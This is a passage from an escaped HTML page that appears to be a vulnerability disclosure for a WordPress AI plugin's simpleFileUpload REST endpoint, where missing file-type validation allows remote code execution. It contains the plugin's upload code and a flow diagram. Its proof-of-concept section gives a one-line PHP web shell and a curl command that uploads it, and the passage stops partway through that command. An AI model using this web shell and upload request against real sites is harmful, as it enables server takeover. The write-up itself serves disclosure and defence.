class=&#34;nx&#34;&gt;download_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_wp_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tmp&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_error_message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_array&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unique_filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tmp&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_array&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unique_filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;media_handle_sideload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_wp_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_error_message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_get_attachment_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_post_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_mwai_file_id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refId&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_post_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_mwai_file_expires&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expires&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Store&amp;ensp;additional&amp;ensp;metadata&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metaKey&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metaValue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_post_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_mwai_&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metaKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metaValue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Store&amp;ensp;purpose&amp;ensp;and&amp;ensp;envId&amp;ensp;as&amp;ensp;post&amp;ensp;meta&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_post_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_mwai_purpose&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$envId&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_post_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_mwai_envId&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$envId&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;upload_file()&lt;/code&gt; function handles file storage and names files as follows:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Determine filename and extension: if &lt;code&gt;$filename&lt;/code&gt; is not provided, extract it from &lt;code&gt;$path&lt;/code&gt; and preserve the extension.&lt;/li&gt;&#xA;&lt;li&gt;Generate a unique filename by concatenating &lt;code&gt;$refId&lt;/code&gt; with the extension, then use &lt;code&gt;wp_unique_filename()&lt;/code&gt; to avoid collisions in the upload directory.&lt;/li&gt;&#xA;&lt;li&gt;Save the file: if &lt;code&gt;$target&amp;ensp;===&amp;ensp;&#39;uploads&#39;&lt;/code&gt; it copies into the uploads directory, if &lt;code&gt;$target&amp;ensp;===&amp;ensp;&#39;library&#39;&lt;/code&gt; it adds it to the Media Library using &lt;code&gt;media_handle_sideload()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Return &lt;code&gt;$refId&lt;/code&gt;. The file is stored as &lt;code&gt;&amp;lt;refId&amp;gt;.&amp;lt;extension&amp;gt;&lt;/code&gt; in the uploads directory or Media Library, with metadata if provided.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;POST&amp;ensp;/wp-json/mwai/v1/simpleFileUpload&#34;]&amp;ensp;--&gt;&amp;ensp;B{&#34;permission_callback&#34;}&#xD;&#xA;B&amp;ensp;--&amp;ensp;Authenticated&amp;ensp;(X-WP-Nonce&amp;ensp;or&amp;ensp;Bearer)&amp;ensp;--&gt;&amp;ensp;C[&#34;rest_simpleFileUpload()&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;simpleFileUpload()&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;files-&gt;upload_file(tmp_name,&amp;ensp;name,&amp;ensp;target,&amp;ensp;...)&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;Determine&amp;ensp;extension&amp;ensp;→&amp;ensp;newFilename&amp;ensp;=&amp;ensp;refId.extension&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G{&#34;target&amp;ensp;===&amp;ensp;&#39;uploads&#39;&amp;ensp;?&#34;}&#xD;&#xA;G&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;H[&#34;copy(path,&amp;ensp;destination)&amp;ensp;→&amp;ensp;file&amp;ensp;placed&amp;ensp;in&amp;ensp;uploads&#34;]&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I{&#34;No&amp;ensp;filetype&amp;ensp;validation&#34;}&#xD;&#xA;I&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;J[&#34;Uploaded&amp;ensp;.php&amp;ensp;accessible&amp;ensp;via&amp;ensp;URL&#34;]&#xD;&#xA;J&amp;ensp;--&gt;&amp;ensp;L[&#34;Response&amp;ensp;contain&amp;ensp;URL&amp;ensp;to&amp;ensp;file&#34;]&#xD;&#xA;L&amp;ensp;--&gt;&amp;ensp;K[&#34;Execute&amp;ensp;PHP&amp;ensp;→&amp;ensp;Remote&amp;ensp;Code&amp;ensp;Execution&amp;ensp;(RCE)&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&amp;ensp;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Upload the web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl&amp;ensp;-X&amp;ensp;POST&amp;ensp;&lt;span class=&#34;se&#34;&gt;\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://localhost/wp-json/mwai/v1/simpleFileUpload&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;se&#34;&gt;\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;-H&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;X-WP-Nonce:&amp;ensp;51e6c4a45a&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;se&#34;&gt;\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;-F&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file=@rce.php&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;se&#34;&gt;\&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;-b&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;wp-settings-time-1=1762427921;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span 